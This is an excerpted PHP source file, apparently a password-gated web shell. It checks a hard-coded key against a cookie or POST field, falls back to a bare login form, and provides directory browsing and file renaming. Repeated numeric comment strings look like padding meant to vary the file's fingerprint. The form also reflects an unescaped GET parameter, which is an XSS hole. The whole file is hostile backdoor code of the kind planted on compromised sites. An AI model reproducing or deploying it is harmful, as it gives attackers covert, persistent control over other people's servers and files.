...
$auth_key = "6cf186a707b03a50636dd870a3b18572";
...
$pass = false;
if (isset($_COOKIE['pw_name_33004'])) {
    if(($_COOKIE['pw_name_33004']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_33004'])) {
        if(($_POST['pw_name_33004']) == $auth_key) {
            setcookie("pw_name_33004", $_POST['pw_name_33004']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_33004' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724276065485173 1724276065941926 1724276065804711 1724276065576665
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724276065485173 1724276065941926 1724276065804711 1724276065576665
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724276065485173 1724276065941926 1724276065804711 1724276065576665
            $name = PATH . "/" . $_GET['r'];
